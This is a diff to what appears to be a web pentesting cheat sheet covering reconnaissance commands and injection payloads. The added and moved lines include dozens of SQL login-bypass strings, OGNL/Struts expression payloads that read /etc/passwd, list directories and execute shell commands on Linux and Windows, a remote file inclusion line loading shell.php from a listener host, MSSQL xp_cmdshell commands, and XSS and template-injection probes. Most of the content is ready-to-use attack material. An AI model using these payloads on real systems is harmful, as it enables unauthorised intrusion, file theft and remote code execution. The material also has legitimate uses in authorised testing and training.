@@ -109,9 +109,9 @@ waybackurls <target> | grep "\.js" | uniq | sort
 ### Services
 
 ```bash
-nmap -sS -sV -O --top-ports 1000 --script=banner,nse,http-head -oA top_1000
-nmap -sT -sV -O -p- -oA full_scan
-nmap -sU -sV --top-ports 1000 --open -oA udp_1000
+nmap -sS -sV -O --top-ports 1000 --script=banner,nse,http-head -oA top_1000 <target>
+nmap -sT -sV -O -p- -oA full_scan <target>
+nmap -sU -sV --top-ports 1000 --open -oA udp_1000 <target>
 ```
 
 ---
@@ -157,8 +157,8 @@ dirsearch -u <target> -e php,html,js,xml -x 500,403
 wfuzz -c -z file,/root/wordlist.txt --hc 404 <target>/FUZZ
 wfuzz -c -z file,/root/wordlist.txt --hc 404 --hl 0 <target>/FUZZ
 
-gobuster dir -u https://buffered.io -w ~/wordlists/shortlist.txt -l -v
-gobuster fuzz -u https://example.com/?FUZZ=test -w parameter-names.txt
+gobuster dir -u https://<target> -w ~/wordlists/shortlist.txt -l -v
+gobuster fuzz -u https://<target>/?FUZZ=test -w parameter-names.txt
 ```
 
 URL finder
@@ -170,19 +170,19 @@ link finder
 
 ```bash
 https://github.com/GerbenJavado/LinkFinder
-python linkfinder.py -i https://example.com -d -o cli
+python linkfinder.py -i https://<target> -d -o cli
 ```
 
 Directory listing recustive dump
 
 ```bash
-wget -r --no-parent target.com/dir
+wget -r --no-parent http://<target>/dir
 ```
 
 Find asset and params
 
 ```bash
-assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
+assetfinder <target> | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"; done
 ```
 
 ---
@@ -191,24 +191,20 @@ assetfinder example.com | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)
 
 ### LFI
 
-Local file inclusion
-
-FUZZ
+Local file inclusion fuzzing
 
 ```bash
 wfuzz -c -w <lfi.txt> --hw 0 <target>?page=../../../../../../../FUZZ
 ```
 
-Get shell
-
-**RFI**
+Getting shell from RFI
 
 ```bash
-<target>?page=http://<attacker>/shell.php
-<target>?page=\\<attacker>\<shared_folder>\shell.php
+<target>?page=http://<listener_ip>/shell.php
+<target>?page=\\<listener_ip>\<shared_folder>\shell.php
 ```
 
-**PHP wrappers**
+**PHP wrapper**
 
 - PHP Expect
 
@@ -250,23 +246,58 @@ User-Agent: <?php phpinfo(); ?>
 
 ---
 
-
-### SSTI
-
-Server Side Template Injection
-
-```bash
-"<%= 7 * 7 %>"@example.com 
-test+(${{7*7}})@example.com
-```
-
----
-
 ### SQLI
 
-SQL Injection
+**SQL Injection**
 
-For http://site.com/?q=INJECT_HERE
+Bypass authentication
+
+```bash
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+admin" --
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+```
+
+Fuzzing parameter
 
 ```bash
 /?q=1
@@ -312,32 +343,6 @@ MSSQL shell
 ```bash
 enable_xp_cmdshell; EXEC xp_cmdshell 'whoami'
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--;EXEC xp_cmdshell 'whoami'
-```
-
----
-
-### ELI
-
-Expression Language Injection
-
-```bash
-# J2EEScan detection vector
-https://www.example.url/?vulnerableParameter=PRE-${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.print(new java.lang.Integer(829+9)),#kzxs.close(),1?#xx:#request.toString}-POST&INJPARAM=HOOK_VAL
-
-# Blind detection vector
-https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@java.lang.Thread@sleep(10000),1?#xx:#request.toString}
-
-# RFI
-https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=new java.io.FileInputStream(#wwww),#qqqq=new java.lang.Long(#wwww.length()),#tttt=new byte[#qqqq.intValue()],#llll=#pppp.read(#tttt),#pppp.close(),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(new java.lang.String(#tttt)),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=/etc/passwd
-
-# DIR LIST
-https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=#wwww.listFiles(),#qqqq=@java.util.Arrays@toString(#pppp),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#qqqq),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=..
-
-# RCE LINUX
-https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=@java.lang.Runtime@getRuntime(),#ssss=new java.lang.String[3],#ssss[0]="/bin/sh",#ssss[1]="-c",#ssss[2]=#parameters.INJPARAM[0],#wwww.exec(#ssss),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=touch /tmp/InjectedFile.txt
-
-# RCE WINDOWS
-https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
 ```
 
 ---
@@ -395,11 +400,56 @@ ssrfuzz scan -d file_of_domains.txt
 Cross-Site Scripting
 
 ```bash
-test+(<script>alert(0)</script>)@example.com
-test@example(<script>alert(0)</script>).com
-"<script>alert(0)</script>"@example.com
+<svg/onload=prompt(1000)>
+
+test+(<script>prompt(1000)</script>)@example.com
+test@example(<script>prompt(1000)</script>).com
+"<script>alert(1000)</script>"@example.com
 ```
 
+
+---
+
+
+### SSTI
+
+Server Side Template Injection
+
+```bash
+{{8*8}}
+${9*9}
+#{6*6}
+<%= 5 * 5 %>
+
+"<%= 7 * 7 %>"@example.com 
+test+(${{7*7}})@example.com
+```
+
+---
+
+### ELI
+
+Expression Language Injection
+
+```bash
+# J2EEScan detection vector
+https://www.example.url/?vulnerableParameter=PRE-${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.print(new java.lang.Integer(829+9)),#kzxs.close(),1?#xx:#request.toString}-POST&INJPARAM=HOOK_VAL
+
+# Blind detection vector
+https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#kzxs=@java.lang.Thread@sleep(10000),1?#xx:#request.toString}
+
+# RFI
+https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=new java.io.FileInputStream(#wwww),#qqqq=new java.lang.Long(#wwww.length()),#tttt=new byte[#qqqq.intValue()],#llll=#pppp.read(#tttt),#pppp.close(),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(new java.lang.String(#tttt)),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=/etc/passwd
+
+# DIR LIST
+https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=new java.io.File(#parameters.INJPARAM[0]),#pppp=#wwww.listFiles(),#qqqq=@java.util.Arrays@toString(#pppp),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#qqqq),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=..
+
+# RCE LINUX
+https://www.example.url/?vulnerableParameter=${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#wwww=@java.lang.Runtime@getRuntime(),#ssss=new java.lang.String[3],#ssss[0]="/bin/sh",#ssss[1]="-c",#ssss[2]=#parameters.INJPARAM[0],#wwww.exec(#ssss),#kzxs=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#kzxs.print(#parameters.INJPARAM[0]),#kzxs.close(),1?#xx:#request.toString}&INJPARAM=touch /tmp/InjectedFile.txt
+
+# RCE WINDOWS
+https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
+```
 
 ---
 
@@ -442,7 +492,6 @@ shell.php%00.jpg
 ```
 
 ---
-
 
 ## **Burp Extenders**
 
